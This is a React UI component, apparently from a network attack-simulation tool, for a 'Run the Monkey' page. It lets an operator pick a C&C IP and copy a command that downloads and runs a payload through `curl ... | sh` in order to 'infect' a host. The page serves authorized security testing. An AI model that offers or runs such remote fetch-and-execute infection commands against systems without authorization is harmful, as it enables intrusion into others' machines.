import React from 'react';
import {Button, Col, Well} from 'react-bootstrap';
import CopyToClipboard from 'react-copy-to-clipboard';
import {Icon} from 'react-fa';

class RunMonkeyPageComponent extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      ips: [],
      selectedIp: '0.0.0.0',
      isRunning: true
    };
  }

  componentDidMount() {
    fetch('/api')
      .then(res => res.json())
      .then(res => this.setState({
        ips: res['ip_addresses'],
        selectedIp: res['ip_addresses'][0]
      }));

    fetch('/api/local-monkey')
      .then(res => res.json())
      .then(res => this.setState({
        isRunning: res['is_running']
      }));
  }

  generateCmd(ip) {
    return `curl http://${ip}:5000/get-monkey | sh`;
  }

  runLocalMonkey = () => {
    fetch('/api/local-monkey',
      {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({action: 'run', ip: this.state.selectedIp})
      })
      .then(res => res.json())
      .then(res => {
        this.setState({
          isRunning: res['is_running']
        });
      });
  };

  setSelectedIp = (event) => {
    this.setState({selectedIp: event.target.value});
  };

  render() {
    return (
      <Col xs={8}>
        <h1 className="page-title">Run the Monkey</h1>
        <p>
          Select one of the server's IP addresses:
          <select value={this.state.selectedIp} onChange={this.setSelectedIp}
                  className="form-control inline-select">
            {this.state.ips.map(ip =>
              <option value={ip}>{ip}</option>
            )}
          </select>
          <br/>That address will be used as the monkey's C&C address.
        </p>
        <p>Run this snippet on a host for manually infecting it with a Monkey:</p>
        <Well>
          <CopyToClipboard text={this.generateCmd(this.state.selectedIp)} className="pull-right">
            <Button style={{margin: '-0.5em'}} title="Copy to Clipboard">
              <Icon name="clipboard"/>
            </Button>
          </CopyToClipboard>
          <code>{this.generateCmd(this.state.selectedIp)}</code>
        </Well>
        <p>
          Or simply click here to <a onClick={this.runLocalMonkey}
                                     className="btn btn-default btn-sm"
                                     style={{'marginLeft': '0.2em'}}>Run on <b>{this.state.selectedIp}</b></a>
          { this.state.isRunning ?
            <i className="text-success" style={{'marginLeft': '5px'}}>Running...</i>
            : ''}
        </p>
      </Col>
    );
  }
}

export default RunMonkeyPageComponent;
